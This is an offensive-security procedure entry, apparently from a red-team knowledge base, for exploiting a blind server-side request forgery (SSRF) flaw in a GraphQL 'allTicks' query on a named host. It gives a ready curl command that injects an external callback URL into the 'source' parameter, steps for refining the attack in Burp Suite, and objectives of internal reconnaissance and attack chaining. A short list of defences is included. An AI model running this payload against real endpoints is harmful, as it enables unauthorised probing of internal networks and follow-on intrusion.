---
id: b146721a-ca64-4f8d-969a-0794c9755949
name: Send-Malicious-GraphQL-Query-to-Trigger-SSRF
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.423Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - ssrf
  - graphql
  - exploit
commands:
  - '[[commands/curl-graphql-ssrf]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Send-Malicious-GraphQL-Query-to-Trigger-SSRF

## Summary

This procedure crafts and sends a GraphQL POST request to the vulnerable 'allTicks' query on pwapi.ex2b.com, injecting an arbitrary URL into the 'source' parameter to trigger a blind SSRF, forcing the server to make unintended GET requests.

## Description

The 'allTicks' query lacks validation on the 'source' parameter, allowing full URLs that cause server-side fetches. Using Burp Suite or curl, attackers embed external or internal URLs to scan ports or access services. In this scenario, a Collaborator URL confirms the SSRF without leaking responses. Expected outcomes include server-initiated requests, enabling further reconnaissance on internal networks.

## Requirements

1. Access to the GraphQL endpoint https://pwapi.ex2b.com/graphql.
2. Burp Suite or curl for request crafting.
3. Collaborator payload from prior setup.

## Defense

Defensive measures and detection strategies:

- Validate and sanitize URL inputs in GraphQL resolvers to enforce allowlists.
- Log and alert on server-side HTTP/DNS requests to unexpected domains.
- Deploy network segmentation to limit internal access from web servers.

## Objectives

1. Inject arbitrary URL into 'source' parameter.
2. Trigger server-side GET without direct response leakage.
3. Confirm exploitation feasibility for chaining attacks.

## Instructions

### Step 1: Craft the GraphQL Query

**Context**: Prepare the query body with the malicious source URL.

Use [[commands/curl-graphql-ssrf]] to send the request:

```bash
curl -X POST https://pwapi.ex2b.com/graphql -H "Content-Type: application/json" -d '{"query": "query { allTicks(source: \"http://[collaborator-domain]/test\") { id } }"}'
```

> This sends the POST; replace [collaborator-domain] with your payload. Expected output: JSON response like {"data":{"allTicks":[]}}, no errors.

### Step 2: Intercept and Modify in Burp

**Context**: For precision, proxy through Burp Suite Repeater.

No specific command; send via browser or curl through Burp proxy, then modify 'source' in Repeater.

> Drop and forward the modified request. Expected output: Similar successful GraphQL response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-ssrf]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[ssrf]]
- [[graphql]]
- [[exploit]]
